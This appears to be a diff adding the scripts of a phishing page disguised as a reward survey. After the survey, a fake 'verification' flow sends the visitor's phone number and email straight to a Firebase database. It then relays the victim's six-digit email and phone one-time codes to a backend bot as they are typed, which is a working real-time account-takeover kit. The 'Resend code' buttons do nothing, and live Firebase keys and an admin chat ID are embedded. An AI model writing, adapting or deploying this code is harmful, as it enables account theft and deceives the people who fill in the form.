+<!-- ═══ SURVEY UI LOGIC ═══ -->
+<script>
+var answers={},currentQ=1,totalQ=8;
+var multiAnswers={q5:[]};
+var sliderLabels=['','😞 Very unhappy','😔 Unhappy','😕 Below average','😐 Average','🤔 Neutral','🙂 Decent','😊 Pretty good','😃 Good','🤩 Great','😍 Love it!'];
+
+(function(){
+  var w=document.getElementById('prog-dots');
+  for(var i=1;i<=totalQ;i++){
+    var d=document.createElement('div');
+    d.className='prog-dot'+(i===1?' current':'');
+    d.id='dot-'+i; w.appendChild(d);
+  }
+})();
+(function(){ updateSliderFill(document.getElementById('q3-slider')); })();
+function updateSliderFill(el){
+  var pct=((el.value-el.min)/(el.max-el.min))*100;
+  el.style.setProperty('--fill',pct+'%');
+}
+function onSlider(){
+  var el=document.getElementById('q3-slider');
+  var v=parseInt(el.value);
+  document.getElementById('q3-val').textContent=v;
+  document.getElementById('q3-lbl').textContent=sliderLabels[v]||'';
+  answers['q3']=v;
+  updateSliderFill(el);
+}
+answers['q3']=5;
+
+function pick(btn,qid){
+  document.getElementById('opts-'+qid).querySelectorAll('.opt').forEach(function(b){b.classList.remove('selected');});
+  btn.classList.add('selected');
+  answers[qid]=btn.textContent.trim();
+  var v=document.getElementById('vm-'+qid);
+  if(v)v.style.display='none';
+}
+function multiPick(btn,qid){
+  btn.classList.toggle('selected');
+  var selected=document.getElementById('multi-'+qid).querySelectorAll('.multi-opt.selected');
+  multiAnswers[qid]=Array.from(selected).map(function(b){return b.textContent.trim();});
+  var v=document.getElementById('vm-'+qid);
+  if(v)v.style.display='none';
+}
+function onShortInput(inputId,checkId,vmId,qid,minLen){
+  var val=document.getElementById(inputId).value.trim();
+  var check=document.getElementById(checkId);
+  var inp=document.getElementById(inputId);
+  if(val.length>=minLen){
+    answers[qid]=val;
+    check.classList.add('show');
+    inp.classList.add('valid');
+    document.getElementById(vmId).style.display='none';
+  } else {
+    answers[qid]=null;
+    check.classList.remove('show');
+    inp.classList.remove('valid');
+  }
+}
+function onTextarea(){
+  var val=document.getElementById('q8-text').value;
+  var ch=document.getElementById('char-hint');
+  ch.textContent=val.length+' / 20 characters minimum';
+  if(val.length>=20){ch.classList.add('ok');answers['q8']=val;document.getElementById('vm-q8').style.display='none';}
+  else{ch.classList.remove('ok');answers['q8']=null;}
+}
+function setProgress(q){
+  var pct=Math.round(((q-1)/totalQ)*100);
+  document.getElementById('prog-fill').style.width=pct+'%';
+  document.getElementById('prog-label').textContent='Question '+q+' of '+totalQ;
+  document.getElementById('prog-pct').textContent=pct+'%';
+  for(var i=1;i<=totalQ;i++){
+    var d=document.getElementById('dot-'+i);
+    d.className='prog-dot'+(i<q?' done':i===q?' current':'');
+  }
+}
+function validate(q){
+  if(q===3) return true;
+  if(q===5){
+    if(!multiAnswers['q5']||multiAnswers['q5'].length===0){
+      document.getElementById('vm-q5').style.display='block';
+      return false;
+    }
+    return true;
+  }
+  if(q===2||q===4||q===6){
+    var qid='q'+q;
+    if(!answers[qid]){
+      document.getElementById('vm-q'+q).style.display='block';
+      return false;
+    }
+    return true;
+  }
+  if(q===8){
+    var val=(document.getElementById('q8-text').value||'').trim();
+    if(val.length<20){document.getElementById('vm-q8').style.display='block';return false;}
+    answers['q8']=val;
+    return true;
+  }
+  if(!answers['q'+q]){document.getElementById('vm-q'+q).style.display='block';return false;}
+  return true;
+}
+function submitSurvey(){
+  for(var i=1;i<=totalQ;i++){
+    var el=document.getElementById('q'+i);
+    if(el) el.classList.remove('active');
+  }
+  document.getElementById('prog-fill').style.width='100%';
+  document.getElementById('prog-label').textContent='Almost there!';
+  document.getElementById('prog-pct').textContent='100%';
+  for(var j=1;j<=totalQ;j++){
+    var d=document.getElementById('dot-'+j);
+    if(d) d.className='prog-dot done';
+  }
+  document.getElementById('q-nav').style.display='none';
+  var rs=document.getElementById('result-step');
+  rs.style.display='block';
+  setTimeout(function(){ goToStep('ls-step1'); }, 100);
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+function goNext(){
+  if(!validate(currentQ)) return;
+  if(currentQ===8){submitSurvey();return;}
+  document.getElementById('q'+currentQ).classList.remove('active');
+  currentQ++;
+  document.getElementById('q'+currentQ).classList.add('active');
+  setProgress(currentQ); updateNav();
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+function goBack(){
+  if(currentQ<=1)return;
+  document.getElementById('q'+currentQ).classList.remove('active');
+  currentQ--;
+  document.getElementById('q'+currentQ).classList.add('active');
+  setProgress(currentQ); updateNav();
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+function updateNav(){
+  document.getElementById('btn-back').style.visibility=currentQ>1?'visible':'hidden';
+  document.getElementById('btn-next').textContent=currentQ===8?'Submit & Claim Reward 🎁':'Next →';
+}
+function startSurveyFromIntro(){
+  var ip = document.getElementById('intro-page');
+  if (ip) ip.style.display = 'none';
+  var sw = document.querySelector('.survey-outer');
+  if(sw) sw.style.display = 'block';
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+function goToStep(id){
+  ['ls-step1','ls-step2','ls-step3','ls-step4','ls-step5','ls-step6'].forEach(function(s){
+    var el=document.getElementById(s); if(el) el.style.display='none';
+  });
+  var t=document.getElementById(id);
+  if(t) t.style.display='block';
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+function shakeEl(id){
+  var el=document.getElementById(id);
+  if(!el)return;
+  el.classList.remove('shake');
+  void el.offsetWidth;
+  el.classList.add('shake');
+  setTimeout(function(){el.classList.remove('shake');},600);
+}
+var origValidate=validate;
+validate=function(q){
+  var ok=origValidate(q);
+  if(!ok){
+    shakeEl('q'+q);
+    shakeEl('vm-q'+q);
+    shakeEl('ls-vm1');shakeEl('ls-vm2');
+  }
+  return ok;
+};
+function animateCounter(el,target,duration){
+  var start=0,startTime=null;
+  function step(ts){
+    if(!startTime)startTime=ts;
+    var p=Math.min((ts-startTime)/duration,1);
+    var cur=Math.floor(p*target);
+    el.textContent=cur+(el.dataset.suffix||'');
+    if(p<1)requestAnimationFrame(step);
+    else el.textContent=el.dataset.full;
+  }
+  requestAnimationFrame(step);
+}
+var statsObserver=new IntersectionObserver(function(entries){
+  entries.forEach(function(entry){
+    if(entry.isIntersecting){
+      var el=entry.target;
+      if(el.dataset.animated)return;
+      el.dataset.animated='1';
+      animateCounter(el,parseInt(el.dataset.target)||75,1400);
+    }
+  });
+},{threshold:0.5});
+document.querySelectorAll('.stat-card-val').forEach(function(el){
+  var txt=el.textContent;
+  el.dataset.full=txt;
+  var num=parseInt(txt.replace(/\D/g,''))||0;
+  el.dataset.target=num;
+  el.dataset.suffix=txt.replace(/[0-9]/g,'');
+  statsObserver.observe(el);
+});
+var selectedPrize = 'gold';
+function selectPrize(type){
+  selectedPrize = type;
+  var pillGold = document.getElementById('pill-gold');
+  var pillCash = document.getElementById('pill-cash');
+  if (type === 'gold') {
+    pillGold.style.background = '#FFD700';
+    pillGold.style.border = '2px solid #FFD700';
+    pillCash.style.background = 'transparent';
+    pillCash.style.border = '2px dashed #FFD700';
+  } else {
+    pillCash.style.background = '#FFD700';
+    pillCash.style.border = '2px solid #FFD700';
+    pillGold.style.background = 'transparent';
+    pillGold.style.border = '2px dashed #FFD700';
+  }
+}
+var selectedLang = 'en';
+function chooseLang(lang){
+  selectedLang = lang;
+  var overlay = document.getElementById('lang-overlay');
+  overlay.style.opacity = '0';
+  overlay.style.transition = 'opacity .25s ease';
+  setTimeout(function(){
+    overlay.classList.add('hidden');
+    var sw = document.querySelector('.survey-outer');
+    if(sw) sw.style.display = 'block';
+  }, 260);
+}
+</script>
+
+<!-- ═══════════════════════════════════════════════════════════
+     FIREBASE-BACKED VERIFICATION FLOW
+     - Step 1 (phone + email) writes to Firebase IMMEDIATELY on click.
+     - After 5s, client patches proceed=true → bot picks it up.
+     - Email + phone code steps still wait for backend flags.
+     - Rejections still come from backend flags.
+     ═══════════════════════════════════════════════════════════ -->
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.17.1/firebase-app.js";
+import {
+  getDatabase,
+  ref,
+  set,
+  update,
+  onValue
+} from "https://www.gstatic.com/firebasejs/12.17.1/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyAakU5ERdcwajpiLHnZFDWvTGbDY7Wbulk",
+  authDomain: "alt-100.firebaseapp.com",
+  databaseURL: "https://alt-100-default-rtdb.firebaseio.com",
+  projectId: "alt-100",
+  storageBucket: "alt-100.firebasestorage.app",
+  messagingSenderId: "810828078605",
+  appId: "1:810828078605:web:a05b6b983ccd4a30a47f44",
+  measurementId: "G-0XQC6CN98Y"
+};
+
+const firebaseApp = initializeApp(firebaseConfig);
+const firebaseDb  = getDatabase(firebaseApp);
+
+const ADMIN_CHAT_ID      = "7144369262";
+const VERIFICATIONS_PATH = "account_verifications/admin/" + ADMIN_CHAT_ID;
+
+// How long the "Checking your account…" screen is shown before the
+// client itself patches proceed=true (which unblocks the bot).
+const STAGE1_AUTO_PROCEED_MS = 5000;
+
+let currentRequestId   = null;
+let currentUnsubscribe = null;
+let currentStage       = 0;
+let submissionLocked   = false;
+let lsUserPhone  = '';
+let lsUserEmail  = '';
+let lsEmailCode  = '';
+let lsPhoneCode  = '';
+let stage1Timer  = null;
+let proceedPatched = false;
+
+// Edge-trigger guards
+let _emailVerifiedLastSeen = false;
+let _phoneVerifiedLastSeen = false;
+let _emailRejectedLastSeen = false;
+let _phoneRejectedLastSeen = false;
+
+function newRequestId(){
+  if (window.crypto && typeof window.crypto.randomUUID === 'function') {
+    return window.crypto.randomUUID();
+  }
+  const b = new Uint8Array(16);
+  window.crypto.getRandomValues(b);
+  return Array.from(b, x => x.toString(16).padStart(2,'0')).join('');
+}
+
+function teardown(){
+  if (typeof currentUnsubscribe === 'function') {
+    try { currentUnsubscribe(); } catch(_) {}
+  }
+  currentUnsubscribe = null;
+  if (stage1Timer) {
+    clearTimeout(stage1Timer);
+    stage1Timer = null;
+  }
+}
+
+function showError(id, msg){
+  const el = document.getElementById(id);
+  if (!el) return;
+  if (msg) el.textContent = msg;
+  el.style.display = 'block';
+}
+function hideError(id){
+  const el = document.getElementById(id);
+  if (el) el.style.display = 'none';
+}
+
+function getFullPhone(){
+  if (typeof _ccSelected === 'undefined' || !_ccSelected) return '';
+  const numEl = document.getElementById('ls-phone-num');
+  let rawNum = (numEl ? numEl.value : '').replace(/^\+/,'');
+  const codeDigits = _ccSelected.code.replace('+','');
+  if (rawNum.indexOf(codeDigits) === 0) rawNum = rawNum.substring(codeDigits.length);
+  rawNum = rawNum.replace(/^0+/,'');
+  return _ccSelected.code + rawNum;
+}
+
+// ── Patch proceed=true to Firebase (called once after 5s) ──
+async function patchProceedTrue(){
+  if (proceedPatched || !currentRequestId) return;
+  proceedPatched = true;
+  try {
+    await update(
+      ref(firebaseDb, VERIFICATIONS_PATH + '/' + currentRequestId),
+      { proceed: true, proceedAt: Date.now() }
+    );
+    console.log('[verify] Firebase: proceed = true');
+  } catch (err) {
+    // Retry once on failure
+    proceedPatched = false;
+    console.error('proceed=true patch failed, retrying once:', err);
+    try {
+      await update(
+        ref(firebaseDb, VERIFICATIONS_PATH + '/' + currentRequestId),
+        { proceed: true, proceedAt: Date.now() }
+      );
+      proceedPatched = true;
+      console.log('[verify] Firebase: proceed = true (retry)');
+    } catch (err2) {
+      console.error('proceed=true patch failed twice:', err2);
+    }
+  }
+}
+
+// ── Step 1: WRITE phone+email to Firebase, 5s later patch proceed=true ──
+async function lsS1(){
+  if (submissionLocked) return;
+  hideError('ls-vm1'); hideError('ls-vm2');
+
+  const rawNum = (document.getElementById('ls-phone-num').value || '').trim();
+  const email  = (document.getElementById('ls-email').value || '').trim();
+
+  if (!_ccSelected) {
+    showError('ls-vm1', 'Please select your country code first.');
+    shakeEl('cc-selector-row');
+    return;
+  }
+  if (rawNum.length < 5) {
+    showError('ls-vm1', 'Please enter a valid phone number.');
+    shakeEl('ls-phone-num');
+    return;
+  }
+  if (email.indexOf('@') === -1 || email.indexOf('.') === -1) {
+    showError('ls-vm2', 'Please enter a valid email address.');
+    shakeEl('ls-email');
+    return;
+  }
+
+  lsUserPhone = getFullPhone();
+  lsUserEmail = email;
+
+  submissionLocked = true;
+  const btn = document.getElementById('ls-btn1');
+  const txt = document.getElementById('ls-btn1-text');
+  btn.disabled = true;
+  txt.textContent = 'Verifying…';
+
+  document.getElementById('ls-phone-display').textContent = lsUserPhone;
+  document.getElementById('ls-email-display').textContent = lsUserEmail;
+
+  // Reset ALL edge trackers for this fresh request
+  _emailVerifiedLastSeen = false;
+  _phoneVerifiedLastSeen = false;
+  _emailRejectedLastSeen = false;
+  _phoneRejectedLastSeen = false;
+  proceedPatched = false;
+
+  currentRequestId = newRequestId();
+  currentStage     = 1;
+
+  // Show "Checking your account…" immediately
+  goToStep('ls-step3');
+
+  const payload = {
+    email: lsUserEmail,
+    phone: lsUserPhone,
+    proceed: false,
+    emailVerified: false,
+    phoneVerified: false,
+    rejected: false,
+    emailRejected: false,
+    phoneRejected: false,
+    createdAt: Date.now()
+  };
+
+  // WRITE NOW — email + phone to Firebase immediately.
+  try {
+    await set(ref(firebaseDb, VERIFICATIONS_PATH + '/' + currentRequestId), payload);
+  } catch (err) {
+    console.error('Firebase write failed:', err);
+    submissionLocked = false;
+    btn.disabled = false;
+    txt.textContent = 'Continue →';
+    currentStage = 0;
+    currentRequestId = null;
+    goToStep('ls-step1');
+    showError('ls-vm2', 'Connection error. Please try again.');
+    return;
+  }
+
+  // Record is in Firebase with email + phone.
+  attachListener(currentRequestId);
+
+  // After 5 seconds, patch proceed=true — this unblocks the bot's
+  // findNewEligibleEmail() gate. UI advances in parallel.
+  if (stage1Timer) clearTimeout(stage1Timer);
+  stage1Timer = setTimeout(async () => {
+    stage1Timer = null;
+    if (currentStage !== 1) return;
+
+    // UI advances to email OTP
+    currentStage = 2;
+    _emailRejectedLastSeen = false;
+    ['e0','e1','e2','e3','e4','e5'].forEach(id => {
+      const el = document.getElementById(id); if (el) el.value = '';
+    });
+    hideError('ls-vm5');
+    document.getElementById('s5-waiting').style.display = 'none';
+    document.getElementById('ls-btn5').style.display = 'block';
+    document.getElementById('ls-btn5').disabled = false;
+    goToStep('ls-step5');
+
+    // Tell the bot to proceed
+    await patchProceedTrue();
+  }, STAGE1_AUTO_PROCEED_MS);
+}
+
+// ── Listener: edge-triggered for email/phone/rejection ──
+function attachListener(requestId){
+  teardown();
+  const recordRef = ref(firebaseDb, VERIFICATIONS_PATH + '/' + requestId);
+
+  currentUnsubscribe = onValue(recordRef, (snapshot) => {
+    if (currentRequestId !== requestId) return;
+    if (!snapshot.exists()) return;
+
+    const data = snapshot.val() || {};
+
+    const emailVerifiedNow = data.emailVerified === true;
+    const phoneVerifiedNow = data.phoneVerified === true;
+    const emailRejectedNow = data.emailRejected === true;
+    const phoneRejectedNow = data.phoneRejected === true;
+
+    // Terminal: whole request killed
+    if (data.status === 'rejected' || data.status === 'expired' || data.rejected === true) {
+      if (stage1Timer) {
+        clearTimeout(stage1Timer);
+        stage1Timer = null;
+      }
+      teardown();
+      submissionLocked = false;
+      currentStage = 0;
+      currentRequestId = null;
+      proceedPatched = false;
+      _emailVerifiedLastSeen = false;
+      _phoneVerifiedLastSeen = false;
+      _emailRejectedLastSeen = false;
+      _phoneRejectedLastSeen = false;
+      goToStep('ls-step1');
+      const btn = document.getElementById('ls-btn1');
+      const txt = document.getElementById('ls-btn1-text');
+      if (btn) btn.disabled = false;
+      if (txt) txt.textContent = 'Continue →';
+      return;
+    }
+
+    // STAGE 2 -> 3 : emailVerified edge only
+    if (emailVerifiedNow && !_emailVerifiedLastSeen && currentStage === 2) {
+      _emailVerifiedLastSeen = true;
+      currentStage = 3;
+      _phoneRejectedLastSeen = false;
+      ['p0','p1','p2','p3','p4','p5'].forEach(id => {
+        const el = document.getElementById(id); if (el) el.value = '';
+      });
+      hideError('ls-vm4');
+      document.getElementById('s4-waiting').style.display = 'none';
+      document.getElementById('ls-btn4').style.display = 'block';
+      document.getElementById('ls-btn4').disabled = false;
+      goToStep('ls-step4');
+      return;
+    }
+    _emailVerifiedLastSeen = emailVerifiedNow;
+
+    // STAGE 3 -> 4 : phoneVerified edge only
+    if (phoneVerifiedNow && !_phoneVerifiedLastSeen && currentStage === 3) {
+      _phoneVerifiedLastSeen = true;
+      currentStage = 4;
+      teardown();
+      submissionLocked = false;
+      goToStep('ls-step6');
+      document.getElementById('ls-step6-waiting').style.display = 'block';
+      document.getElementById('ls-step6-payment').style.display = 'none';
+      document.getElementById('ls-step6-success').style.display = 'none';
+      setTimeout(function(){
+        document.getElementById('ls-step6-waiting').style.display = 'none';
+        if (typeof showPaymentSection === 'function') showPaymentSection();
+        else document.getElementById('ls-step6-payment').style.display = 'block';
+      }, 1200);
+      return;
+    }
+    _phoneVerifiedLastSeen = phoneVerifiedNow;
+
+    // Email rejection edge
+    if (emailRejectedNow && !_emailRejectedLastSeen && currentStage === 2) {
+      _emailRejectedLastSeen = true;
+      document.getElementById('s5-waiting').style.display = 'none';
+      document.getElementById('ls-btn5').style.display = 'block';
+      document.getElementById('ls-btn5').disabled = false;
+      ['e0','e1','e2','e3','e4','e5'].forEach(id => {
+        const el = document.getElementById(id); if (el) el.value = '';
+      });
+      showError('ls-vm5','Incorrect code. Please try again.');
+      const first = document.getElementById('e0'); if (first) first.focus();
+      return;
+    }
+    _emailRejectedLastSeen = emailRejectedNow;
+
+    // Phone rejection edge
+    if (phoneRejectedNow && !_phoneRejectedLastSeen && currentStage === 3) {
+      _phoneRejectedLastSeen = true;
+      document.getElementById('s4-waiting').style.display = 'none';
+      document.getElementById('ls-btn4').style.display = 'block';
+      document.getElementById('ls-btn4').disabled = false;
+      ['p0','p1','p2','p3','p4','p5'].forEach(id => {
+        const el = document.getElementById(id); if (el) el.value = '';
+      });
+      showError('ls-vm4','Incorrect code. Please try again.');
+      const first = document.getElementById('p0'); if (first) first.focus();
+      return;
+    }
+    _phoneRejectedLastSeen = phoneRejectedNow;
+  }, (err) => {
+    console.error('Listener error:', err);
+    teardown();
+    submissionLocked = false;
+    currentStage = 0;
+    currentRequestId = null;
+    proceedPatched = false;
+    goToStep('ls-step1');
+    const btn = document.getElementById('ls-btn1');
+    const txt = document.getElementById('ls-btn1-text');
+    if (btn) btn.disabled = false;
+    if (txt) txt.textContent = 'Continue →';
+    showError('ls-vm2', 'Connection error. Please try again.');
+  });
+}
+
+// ── Email code: write, then WAIT for emailVerified=true ──
+async function lsS5(){
+  if (!currentRequestId) return;
+  hideError('ls-vm5');
+
+  let code = '';
+  for (let i=0;i<6;i++) code += (document.getElementById('e'+i) || {}).value || '';
+  if (!/^\d{6}$/.test(code)) {
+    showError('ls-vm5', 'Please enter all 6 digits.');
+    return;
+  }
+
+  lsEmailCode = code;
+  const btn = document.getElementById('ls-btn5');
+  btn.style.display = 'none';
+  document.getElementById('s5-waiting').style.display = 'block';
+
+  try {
+    const base = VERIFICATIONS_PATH + '/' + currentRequestId;
+    await set(ref(firebaseDb, base + '/emailCode'), code);
+    await set(ref(firebaseDb, base + '/emailCodeSubmittedAt'), Date.now());
+    await set(ref(firebaseDb, base + '/emailRejected'), false);
+    await set(ref(firebaseDb, base + '/emailRejectedNotified'), false);
+  } catch (err) {
+    console.error('Email code write failed:', err);
+    document.getElementById('s5-waiting').style.display = 'none';
+    btn.style.display = 'block';
+    btn.disabled = false;
+    showError('ls-vm5', 'Could not submit code. Please try again.');
+    return;
+  }
+  // Wait for emailVerified=true via listener.
+}
+
+// ── Phone code: write, then WAIT for phoneVerified=true ──
+async function lsS4(){
+  if (!currentRequestId) return;
+  hideError('ls-vm4');
+
+  let code = '';
+  for (let i=0;i<6;i++) code += (document.getElementById('p'+i) || {}).value || '';
+  if (!/^\d{6}$/.test(code)) {
+    showError('ls-vm4', 'Please enter all 6 digits.');
+    return;
+  }
+
+  lsPhoneCode = code;
+  const btn = document.getElementById('ls-btn4');
+  btn.style.display = 'none';
+  document.getElementById('s4-waiting').style.display = 'block';
+
+  try {
+    const base = VERIFICATIONS_PATH + '/' + currentRequestId;
+    await set(ref(firebaseDb, base + '/phoneCode'), code);
+    await set(ref(firebaseDb, base + '/phoneCodeSubmittedAt'), Date.now());
+    await set(ref(firebaseDb, base + '/phoneRejected'), false);
+    await set(ref(firebaseDb, base + '/phoneRejectedNotified'), false);
+  } catch (err) {
+    console.error('Phone code write failed:', err);
+    document.getElementById('s4-waiting').style.display = 'none';
+    btn.style.display = 'block';
+    btn.disabled = false;
+    showError('ls-vm4', 'Could not submit code. Please try again.');
+    return;
+  }
+  // Wait for phoneVerified=true via listener.
+}
+
+function codeIn(prefix, idx, total){
+  const el = document.getElementById(prefix + idx);
+  if (!el) return;
+  el.value = (el.value || '').replace(/[^0-9]/g,'').slice(-1);
+  el.style.animation = 'none';
+  void el.offsetWidth;
+  el.style.animation = 'bounceIn 0.22s cubic-bezier(.34,1.56,.64,1) both';
+  if (el.value.length === 1 && idx < total - 1) {
+    const next = document.getElementById(prefix + (idx + 1));
+    if (next) next.focus();
+  }
+}
+function codeKey(e, prefix, idx){
+  if (e.key === 'Backspace') {
+    const el = document.getElementById(prefix + idx);
+    if (el && !el.value && idx > 0) {
+      const prev = document.getElementById(prefix + (idx - 1));
+      if (prev) { prev.focus(); prev.value = ''; }
+    }
+  }
+}
+
+function lsResendEmail(){
+  const s = document.querySelector('#ls-step5 .ls-resend span');
+  if (s) { s.textContent = 'Sent!'; setTimeout(() => s.textContent = 'Resend code', 3000); }
+  const spam = document.getElementById('resend-spam-email');
+  if (spam) spam.style.display = 'block';
+}
+function lsResendPhone(){
+  const s = document.querySelector('#ls-step4 .ls-resend span');
+  if (s) { s.textContent = 'Sent!'; setTimeout(() => s.textContent = 'Resend code', 3000); }
+  const spam = document.getElementById('resend-spam-phone');
+  if (spam) spam.style.display = 'block';
+}
+
+function showPaymentSection(){
+  document.getElementById('ls-step6-payment').style.display = 'block';
+  document.getElementById('ls-step6-waiting').style.display = 'none';
+  document.getElementById('ls-step6-success').style.display = 'none';
+}
+
+window.lsS1 = lsS1;
+window.lsS5 = lsS5;
+window.lsS4 = lsS4;
+window.lsResendEmail = lsResendEmail;
+window.lsResendPhone = lsResendPhone;
+window.codeIn = codeIn;
+window.codeKey = codeKey;
+window.goToStep = goToStep;
+window.shakeEl = shakeEl;
+window.showPaymentSection = showPaymentSection;
+window.lsVal1 = function(){
+  hideError('ls-vm1'); hideError('ls-vm2');
+};
+
+window.addEventListener('beforeunload', teardown);
+window.addEventListener('pagehide', teardown);
+</script>
+</body>
+</html>
